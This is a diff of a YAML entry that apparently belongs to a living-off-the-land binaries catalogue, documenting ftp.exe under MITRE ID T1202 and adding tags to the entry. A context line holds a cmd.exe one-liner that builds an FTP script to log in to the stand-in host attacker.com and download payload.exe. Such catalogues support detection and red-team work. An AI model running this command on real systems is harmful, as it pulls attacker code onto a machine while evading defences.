@@ -11,6 +11,9 @@ Commands:
     Privileges: User
     MitreID: T1202
     OperatingSystem: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
+    Tags:
+      - Execute: CMD
+      - Input: Custom Format
   - Command: cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
     Description: Download
     Usecase: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
